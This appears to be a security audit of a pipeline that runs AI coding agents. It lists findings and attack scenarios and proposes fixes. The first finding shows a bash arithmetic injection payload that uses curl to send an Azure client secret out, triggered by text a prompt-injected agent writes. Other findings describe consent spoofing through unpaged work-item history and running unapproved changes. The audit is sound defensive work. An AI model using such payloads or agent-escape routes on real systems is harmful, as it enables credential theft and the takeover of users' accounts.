findings.message: `rc` is read from `$STATUS/exit`. The agent initContainer writes that file on a read-write `status` volume, so agent code (including prompt-injected code) controls it. `rc` is then evaluated in bash arithmetic: `$(( rc != 0 ? rc : 3 ))` in `fail()` and on the last line. Bash arithmetic recursively evaluates a variable's value, and an array subscript inside that value runs command substitution. So agent-controlled text executes inside the write-back container, which holds `AZURE_CLIENT_SECRET` for the writer service principal. Validate before any use: `[[ "$rc" =~ ^[0-9]{1,3}$ ]] || rc=1`, placed right after the read. Add a variant test that writes non-numeric payloads to `status/exit` (`a[$(touch x)]`, `1+1`, empty) and asserts nothing runs and the exit code is sane.
findings.scenario: Agent writes `x[$(curl -q https://dev.azure.com/... -d "$AZURE_CLIENT_SECRET")]` to /fleet/status/exit and writes `{}` to /fleet/codex/auth.json. writeback.sh fails the jq check and calls fail(), whose `$(( rc != 0 ? rc : 3 ))` runs the curl. The writer SP secret is exfiltrated through an allowlisted host. That SP holds Secrets Officer on every onboarded user's codex-auth-<h>, so every user's codex credential can be read or overwritten.

findings.message: The base is 'last *succeeded* run', but the step fails (`failed=1`) whenever any single dispatch is refused. A refusal is often permanent (no consent, no credential, busy codex). After one, every later run diffs from the same stale green commit and re-dispatches the changes that were already dispatched. Two overlapping runs also share the same base and both dispatch the same approval. The range must be 'since the last processed commit', not 'since the last green run'. Record processed commits, or let refusals not fail the run, and dedupe by change plus dispatched commit (e.g. check for an existing Job or work-item record for that commit).
findings.scenario: Push C1 approves change A (consented) and change B (no fleet:auto). The run dispatches A, B is refused, and the run fails. Push C2 edits any state.json, and base_commit still returns the pre-C1 green commit. A shows as newly approved in the range, so a second Claude Job runs A and spends the assignee's plan again. This repeats on every push until some run succeeds.

findings.message: `auto_tagged_by` reads a single page of `workitems/{id}/updates`: `cmd_updates` passes no `$top`/`$skip` and does not follow continuation. A partial history is treated as complete, and the 'last add event' is taken from that page. Page through all updates (or read revisions until fewer than `$top` come back), and fail closed if paging cannot complete. Add a variant test with a multi-page history.
findings.scenario: A long-lived work item: the assignee alice adds fleet:auto in an early revision and later removes it. Beyond the first page of updates, mallory re-adds fleet:auto. The first page's last add event is alice's, so `tagger == assignee` and consent is granted for a tag the assignee did not add.

findings.message: Approval is read at the dispatched commit, but the pod builds the tip of FLEET_REF. It checks only that the dispatched commit is an ancestor of the tip, never that the proposal is still approved there. The README states 'the base is fresh and still contains the approval', which the code does not guarantee. Re-read `.phases.proposal.status` from the cloned HEAD's state.json and record `failed`/`not-approved-at-ref` before running the agent.
findings.scenario: C1 approves change A and the pipeline dispatches. Before the pod clones, C2 on main sets A's proposal back to draft (or rejected). C1 is an ancestor of the tip, so the check passes, state is set to running, and the agent builds and opens a PR for an unapproved change.

findings.message: The value reader matches only keys at exactly two spaces of indentation (`^  key:`), and it splits on the first `#` even inside quotes. A key that is present in valid YAML but indented differently, or that holds a quoted `#`, reads as absent and falls back to the default silently. The fallback for `deadline_minutes` is a wider limit. Derive the child indent from the first non-blank line under the section, honour quotes when stripping comments, and fail when a key exists but cannot be parsed.
findings.scenario: config.yaml has `fleet:` followed by `    namespace: team-fleet` and `    deadline_minutes: 30` (4-space indent). Dispatch creates the Job in namespace `specclaw-fleet` with a 120-minute deadline, with no error. Separately, `branch_prefix: "wip#/"` is read as `"wip` and stripped to `wip`.

findings.message: `deadline_minutes: 0` passes the `^[0-9]+$` check. The result is FLEET_AGENT_TIMEOUT=0 and activeDeadlineSeconds=600, so every run is killed as `deadline` immediately. Require a positive value with a sane upper bound.

`attempt` counts the Jobs that currently exist with the change label. Codex Jobs are deleted on re-dispatch (fixed name), and all Jobs expire after the 24h TTL, so the recorded attempt number undercounts. Derive it from the work-item history or a persisted counter.

The claude binary is fetched by version only, with no checksum or signature check. `ubuntu/squid:latest` in egress-proxy.yaml is likewise unpinned (the README acknowledges this). Verify a published SHA-256 at build time and pin images by digest.
